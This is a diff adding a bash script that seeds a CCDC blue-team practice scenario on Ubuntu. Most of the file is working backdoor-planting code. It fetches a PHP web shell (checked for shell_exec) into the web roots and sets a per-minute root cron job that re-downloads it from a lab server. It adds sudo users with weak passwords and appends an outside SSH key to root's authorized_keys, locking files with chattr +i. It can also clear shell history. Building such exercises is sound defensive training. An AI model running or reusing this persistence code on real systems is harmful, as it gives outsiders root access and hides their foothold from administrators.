@@ -1,0 +1,539 @@
+#!/usr/bin/env bash
+set -Eeuo pipefail
+
+# Redhavi: CCDC practice scenario for Ubuntu.
+WEB_REPO_URL="${WEB_REPO_URL:-https://github.com/banago/simple-php-website.git}"
+INDEX_URL="${INDEX_URL:-https://raw.githubusercontent.com/4rji/ccdc/main/index.php}"
+ROOT_KEY_URL="${ROOT_KEY_URL:-https://raw.githubusercontent.com/4rji/4rji/main/id_ed25519.pub}"
+LAB_SERVER="${LAB_SERVER:-10.5.8.11}"
+
+# These values pin the expected artifacts. If a URL changes, provide the
+# corresponding hash or fingerprint through the environment as well.
+INDEX_SHA256="${INDEX_SHA256:-adaa044087382af0901cde807ebff2add6391ad7a60250a0650f424758ef3e6e}"
+ROOT_KEY_FINGERPRINT="${ROOT_KEY_FINGERPRINT:-SHA256:7Qgh0gi6zggq9gWnVzhZXji7iXrr6M18wdTk89NK+ew}"
+
+# REDHAVI_ROOT is only intended for tests that use a temporary filesystem.
+REDHAVI_ROOT="${REDHAVI_ROOT:-}"
+WEB_ROOT_LOGICAL="/var/www/simple-php-website"
+WEB_ROOT="${REDHAVI_ROOT}${WEB_ROOT_LOGICAL}"
+AUTH_FILE="${REDHAVI_ROOT}/root/.ssh/authorized_keys"
+KEY_REF="${REDHAVI_ROOT}/var/lib/redhavi/root-key.pub"
+STATE_DIR="${REDHAVI_ROOT}/var/lib/redhavi"
+STATE_FILE="${STATE_DIR}/state"
+LOGIN_SHELL="${REDHAVI_LOGIN_SHELL:-/bin/bash}"
+SCENARIO_VERSION=2
+EXPECTED_CHECKS=9
+CRON_LINE="${CRON_LINE:-* * * * * curl -o ${WEB_ROOT_LOGICAL}/index.php http://${LAB_SERVER}/index.php}"
+
+PACKAGES=(
+    nano
+    curl
+    git
+    php
+    libapache2-mod-php
+    apache2
+    cron
+    e2fsprogs
+    openssh-client
+    telnet
+    ftp
+    tftp
+)
+
+CURRENT_STEP="startup"
+STATE_STARTED=0
+VERIFY_FAILURES=0
+
+log() {
+    printf '[redhavi] %s\n' "$*"
+}
+
+warn() {
+    printf '[redhavi][WARN] %s\n' "$*" >&2
+}
+
+write_state() {
+    local status=$1
+    local tmp_state
+
+    mkdir -p "$STATE_DIR"
+    tmp_state="$(mktemp "${STATE_FILE}.XXXXXX")"
+    {
+        printf 'scenario=redhavi\n'
+        printf 'version=%s\n' "$SCENARIO_VERSION"
+        printf 'status=%s\n' "$status"
+        printf 'expected_checks=%s\n' "$EXPECTED_CHECKS"
+        printf 'step=%s\n' "$CURRENT_STEP"
+        printf 'updated_at=%s\n' "$(date -u '+%Y-%m-%dT%H:%M:%SZ')"
+    } > "$tmp_state"
+    chmod 600 "$tmp_state"
+    mv -f "$tmp_state" "$STATE_FILE"
+}
+
+die() {
+    printf '[redhavi][ERROR] %s\n' "$*" >&2
+    if [ "$STATE_STARTED" -eq 1 ]; then
+        write_state incomplete 2>/dev/null || true
+    fi
+    exit 1
+}
+
+on_error() {
+    local status=$?
+    local line=$1
+
+    trap - ERR
+    if [ "$STATE_STARTED" -eq 1 ]; then
+        write_state incomplete 2>/dev/null || true
+    fi
+    printf '[redhavi][ERROR] Unexpected failure during step "%s", line %s (status %s).\n' \
+        "$CURRENT_STEP" "$line" "$status" >&2
+    exit "$status"
+}
+
+trap 'on_error "$LINENO"' ERR
+
+usage() {
+    cat <<'EOF'
+Usage: redhavi [--verify]
+
+With no options, seeds the CCDC scenario on an authorized Ubuntu machine.
+
+  --verify   Verify the existing deployment without changing it.
+  -h, --help Show this help message.
+
+Optional variables for labs and tests:
+  WEB_REPO_URL, INDEX_URL, INDEX_SHA256, ROOT_KEY_URL,
+  ROOT_KEY_FINGERPRINT, LAB_SERVER, CRON_LINE, and REDHAVI_LOGIN_SHELL.
+EOF
+}
+
+require_root() {
+    if [ "$(id -u)" -ne 0 ]; then
+        die "This script must run as root. Use: sudo $0"
+    fi
+}
+
+require_ubuntu() {
+    local os_release="${REDHAVI_ROOT}/etc/os-release"
+
+    if [ ! -r "$os_release" ]; then
+        die "Could not detect the operating system."
+    fi
+
+    # shellcheck disable=SC1090
+    . "$os_release"
+    if [ "${ID:-}" != "ubuntu" ]; then
+        die "This script is designed for Ubuntu. Detected: ${PRETTY_NAME:-unknown}"
+    fi
+}
+
+require_commands() {
+    local command_name
+
+    for command_name in apt-get awk chattr chown crontab curl dpkg-query getent \
+        git grep id install lsattr mktemp passwd sha256sum ssh-keygen systemctl \
+        useradd usermod; do
+        command -v "$command_name" >/dev/null 2>&1 \
+            || die "Required command is unavailable: $command_name"
+    done
+}
+
+install_packages() {
+    log "Installing scenario packages for Ubuntu..."
+    apt-get update
+    DEBIAN_FRONTEND=noninteractive apt-get install -y "${PACKAGES[@]}"
+}
+
+package_installed() {
+    local pkg=$1
+
+    dpkg-query -W -f='${Status}' "$pkg" 2>/dev/null \
+        | grep -Fxq 'install ok installed'
+}
+
+is_immutable() {
+    local file=$1
+    local attrs
+
+    [ -e "$file" ] || return 1
+    attrs="$(lsattr -d -- "$file" 2>/dev/null | awk 'NR == 1 { print $1 }')" \
+        || return 1
+    case "$attrs" in
+        *i*) return 0 ;;
+        *) return 1 ;;
+    esac
+}
+
+remove_immutable() {
+    local file=$1
+
+    if [ -e "$file" ] && is_immutable "$file"; then
+        chattr -i "$file" || die "Could not remove chattr +i from $file"
+    fi
+}
+
+make_immutable() {
+    local file=$1
+
+    chattr +i "$file" || die "Could not apply chattr +i to $file"
+    is_immutable "$file" || die "Could not confirm the immutable attribute on $file"
+}
+
+payload_is_valid() {
+    local file=$1
+    local actual_hash
+
+    [ -r "$file" ] || return 1
+    grep -Fq 'shell_exec' "$file" || return 1
+    actual_hash="$(sha256sum "$file" | awk '{print $1}')" || return 1
+    [ "$actual_hash" = "$INDEX_SHA256" ]
+}
+
+download_payload() {
+    local output=$1
+    local tmp_payload
+
+    tmp_payload="$(mktemp)"
+    if ! curl -fsSL --retry 3 --connect-timeout 10 --max-time 60 \
+        -o "$tmp_payload" "$INDEX_URL"; then
+        rm -f "$tmp_payload"
+        die "Could not download the PHP payload."
+    fi
+    if ! payload_is_valid "$tmp_payload"; then
+        rm -f "$tmp_payload"
+        die "The PHP payload does not match the expected shell_exec content and SHA-256 hash."
+    fi
+
+    remove_immutable "$output"
+    if ! install -m 0644 "$tmp_payload" "$output"; then
+        rm -f "$tmp_payload"
+        die "Could not install the payload at $output"
+    fi
+    rm -f "$tmp_payload"
+}
+
+copy_payload() {
+    local source=$1
+    local output=$2
+
+    remove_immutable "$output"
+    install -m 0644 "$source" "$output"
+}
+
+setup_web() {
+    local html_index="${REDHAVI_ROOT}/var/www/html/index.php"
+    local parent_index="${REDHAVI_ROOT}/var/www/index.php"
+
+    log "Preparing web files..."
+    mkdir -p "${REDHAVI_ROOT}/var/www" "${REDHAVI_ROOT}/var/www/html"
+
+    if [ -d "$WEB_ROOT/.git" ]; then
+        log "Existing web repository found; attempting to update it..."
+        git -C "$WEB_ROOT" pull --ff-only \
+            || warn "Could not update $WEB_ROOT; keeping its current content."
+    elif [ -d "$WEB_ROOT" ] \
+        && [ -n "$(find "$WEB_ROOT" -mindepth 1 -maxdepth 1 -print -quit)" ]; then
+        warn "$WEB_ROOT already exists and is not a Git repository; it will not be overwritten by a clone."
+    else
+        git clone "$WEB_REPO_URL" "$WEB_ROOT"
+    fi
+
+    download_payload "$WEB_ROOT/index.php"
+    copy_payload "$WEB_ROOT/index.php" "$parent_index"
+    copy_payload "$WEB_ROOT/index.php" "$html_index"
+    make_immutable "$WEB_ROOT/index.php"
+}
+
+install_cron_job() {
+    local tmp_cron
+    local tmp_error
+
+    log "Configuring root's crontab without duplicate entries..."
+    tmp_cron="$(mktemp)"
+    tmp_error="$(mktemp)"
+
+    if LC_ALL=C crontab -u root -l > "$tmp_cron" 2> "$tmp_error"; then
+        :
+    elif grep -Fqi 'no crontab for root' "$tmp_error"; then
+        : > "$tmp_cron"
+    else
+        warn "Could not read root's crontab: $(tr '\n' ' ' < "$tmp_error")"
+        rm -f "$tmp_cron" "$tmp_error"
+        die "A crontab that could not be read safely will not be modified."
+    fi
+
+    if ! grep -Fxq "$CRON_LINE" "$tmp_cron"; then
+        printf '%s\n' "$CRON_LINE" >> "$tmp_cron"
+    fi
+
+    if ! crontab -u root "$tmp_cron"; then
+        rm -f "$tmp_cron" "$tmp_error"
+        die "Could not install root's crontab."
+    fi
+    rm -f "$tmp_cron" "$tmp_error"
+}
+
+enable_services() {
+    log "Starting and enabling apache2 and cron..."
+    systemctl enable --now apache2
+    systemctl enable --now cron
+}
+
+ensure_admin_group() {
+    getent group sudo >/dev/null 2>&1 || groupadd sudo
+}
+
+ensure_user() {
+    local user=$1
+    local password=$2
+    local home_mode=$3
+
+    if id "$user" >/dev/null 2>&1; then
+        log "User $user already exists; restoring the complete vulnerable state."
+        usermod -aG sudo -s "$LOGIN_SHELL" "$user"
+    else
+        log "Creating user $user..."
+        case "$home_mode" in
+            with-home)
+                useradd -m -G sudo -s "$LOGIN_SHELL" "$user"
+                ;;
+            no-home)
+                useradd -M -G sudo -s "$LOGIN_SHELL" "$user"
+                ;;
+            *)
+                die "Invalid home-directory mode for $user: $home_mode"
+                ;;
+        esac
+    fi
+
+    printf '%s:%s\n' "$user" "$password" | chpasswd
+}
+
+setup_users() {
+    log "Configuring practice users..."
+    ensure_admin_group
+    ensure_user ccdc ccdc with-home
+    passwd --expire ccdc
+    ensure_user splunk ass no-home
+}
+
+key_blob_from_file() {
+    local file=$1
+
+    awk 'NF >= 2 && $1 !~ /^#/ { print $2; exit }' "$file"
+}
+
+key_file_has_blob() {
+    local file=$1
+    local key_blob=$2
+
+    [ -r "$file" ] || return 1
+    awk -v key="$key_blob" '
+        {
+            for (i = 1; i <= NF; i++) {
+                if ($i == key) {
+                    found = 1
+                }
+            }
+        }
+        END { exit !found }
+    ' "$file"
+}
+
+key_file_has_fingerprint() {
+    local file=$1
+    local fingerprint
+
+    [ -r "$file" ] || return 1
+    fingerprint="$(ssh-keygen -lf "$file" -E sha256 2>/dev/null \
+        | awk 'NR == 1 {print $2}')" || return 1
+    [ "$fingerprint" = "$ROOT_KEY_FINGERPRINT" ]
+}
+
+setup_root_ssh_key() {
+    local tmp_key
+    local key_line
+    local key_blob
+    local active_lines
+
+    log "Adding the lab SSH key without removing legitimate keys..."
+    tmp_key="$(mktemp)"
+    if ! curl -fsSL --retry 3 --connect-timeout 10 --max-time 60 \
+        -o "$tmp_key" "$ROOT_KEY_URL"; then
+        rm -f "$tmp_key"
+        die "Could not download the SSH key."
+    fi
+
+    active_lines="$(grep -Evc '^[[:space:]]*(#|$)' "$tmp_key" || true)"
+    if [ "$active_lines" -ne 1 ] || ! key_file_has_fingerprint "$tmp_key"; then
+        rm -f "$tmp_key"
+        die "The downloaded key does not match the expected fingerprint."
+    fi
+    key_line="$(grep -Ev '^[[:space:]]*(#|$)' "$tmp_key")"
+    key_blob="$(key_blob_from_file "$tmp_key")"
+
+    mkdir -p "$STATE_DIR" "${REDHAVI_ROOT}/root/.ssh"
+    install -m 0600 "$tmp_key" "$KEY_REF"
+    chmod 700 "${REDHAVI_ROOT}/root/.ssh"
+    remove_immutable "$AUTH_FILE"
+    touch "$AUTH_FILE"
+
+    if ! key_file_has_blob "$AUTH_FILE" "$key_blob"; then
+        if [ -s "$AUTH_FILE" ] && [ -n "$(tail -c 1 "$AUTH_FILE")" ]; then
+            printf '\n' >> "$AUTH_FILE"
+        fi
+        printf '%s\n' "$key_line" >> "$AUTH_FILE"
+    fi
+
+    chown root:root "$KEY_REF" "$AUTH_FILE"
+    chmod 600 "$AUTH_FILE"
+    make_immutable "$AUTH_FILE"
+    rm -f "$tmp_key"
+}
+
+user_is_seeded() {
+    local user=$1
+    local entry
+    local shell
+    local groups
+
+    entry="$(getent passwd "$user")" || return 1
+    shell="$(printf '%s\n' "$entry" | awk -F: '{print $7}')"
+    [ "$shell" = "$LOGIN_SHELL" ] || return 1
+    groups="$(id -nG "$user")" || return 1
+    case " $groups " in
+        *" sudo "*) return 0 ;;
+        *) return 1 ;;
+    esac
+}
+
+cron_is_seeded() {
+    LC_ALL=C crontab -u root -l 2>/dev/null | grep -Fxq "$CRON_LINE"
+}
+
+verify_expect() {
+    local label=$1
+    shift
+
+    if "$@"; then
+        log "POSTCHECK OK: $label"
+    else
+        warn "POSTCHECK FAILED: $label"
+        VERIFY_FAILURES=$((VERIFY_FAILURES + 1))
+    fi
+}
+
+verify_seeded() {
+    local key_blob
+
+    VERIFY_FAILURES=0
+    key_blob="$(key_blob_from_file "$KEY_REF" 2>/dev/null || true)"
+
+    verify_expect "telnet package installed" package_installed telnet
+    verify_expect "ftp package installed" package_installed ftp
+    verify_expect "tftp package installed" package_installed tftp
+    verify_expect "interactive ccdc user in sudo" user_is_seeded ccdc
+    verify_expect "interactive splunk user in sudo" user_is_seeded splunk
+    verify_expect "root cron job seeded" cron_is_seeded
+    verify_expect "apache2 active" systemctl is-active --quiet apache2
+    verify_expect "cron active" systemctl is-active --quiet cron
+    verify_expect "payload at $WEB_ROOT/index.php" payload_is_valid "$WEB_ROOT/index.php"
+    verify_expect "payload at /var/www/index.php" \
+        payload_is_valid "${REDHAVI_ROOT}/var/www/index.php"
+    verify_expect "payload at /var/www/html/index.php" \
+        payload_is_valid "${REDHAVI_ROOT}/var/www/html/index.php"
+    verify_expect "immutable PHP index" is_immutable "$WEB_ROOT/index.php"
+    verify_expect "valid key reference" key_file_has_fingerprint "$KEY_REF"
+    verify_expect "exact SSH key seeded" key_file_has_blob "$AUTH_FILE" "$key_blob"
+    verify_expect "immutable authorized_keys" is_immutable "$AUTH_FILE"
+
+    [ "$VERIFY_FAILURES" -eq 0 ]
+}
+
+state_is_ready() {
+    [ -r "$STATE_FILE" ] \
+        && grep -Fxq 'scenario=redhavi' "$STATE_FILE" \
+        && grep -Fxq "version=${SCENARIO_VERSION}" "$STATE_FILE" \
+        && grep -Fxq 'status=ready' "$STATE_FILE" \
+        && grep -Fxq "expected_checks=${EXPECTED_CHECKS}" "$STATE_FILE"
+}
+
+maybe_clear_history() {
+    if [ "${REDHAVI_CLEAR_HISTORY:-0}" = "1" ]; then
+        history -c 2>/dev/null || true
+        history -w 2>/dev/null || true
+        log "Current shell history cleared."
+    else
+        log "Shell history was not cleared. Set REDHAVI_CLEAR_HISTORY=1 if the exercise requires that artifact."
+    fi
+}
+
+main() {
+    local verify_only=0
+
+    while [ "$#" -gt 0 ]; do
+        case "$1" in
+            --verify)
+                verify_only=1
+                ;;
+            -h|--help)
+                usage
+                return 0
+                ;;
+            *)
+                die "Unknown option: $1"
+                ;;
+        esac
+        shift
+    done
+
+    require_root
+    require_ubuntu
+
+    if [ "$verify_only" -eq 1 ]; then
+        require_commands
+        verify_seeded || die "The deployment is incomplete."
+        state_is_ready || die "The artifacts exist, but the state marker is not ready."
+        log "The deployment is complete and ready for the exercise."
+        return 0
+    fi
+
+    CURRENT_STEP="incomplete state marker"
+    write_state incomplete
+    STATE_STARTED=1
+
+    CURRENT_STEP="package installation"
+    install_packages
+    require_commands
+
+    CURRENT_STEP="web content"
+    setup_web
+
+    CURRENT_STEP="root cron job"
+    install_cron_job
+
+    CURRENT_STEP="services"
+    enable_services
+
+    CURRENT_STEP="users"
+    setup_users
+
+    CURRENT_STEP="SSH key"
+    setup_root_ssh_key
+
+    CURRENT_STEP="history"
+    maybe_clear_history
+
+    CURRENT_STEP="post-validation"
+    verify_seeded || die "Post-validation found an incomplete deployment."
+
+    CURRENT_STEP="ready"
+    write_state ready
+    state_is_ready || die "Could not publish the ready state."
+    log "The Redhavi scenario was seeded and verified successfully."
+}
+
+if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
+    main "$@"
+fi
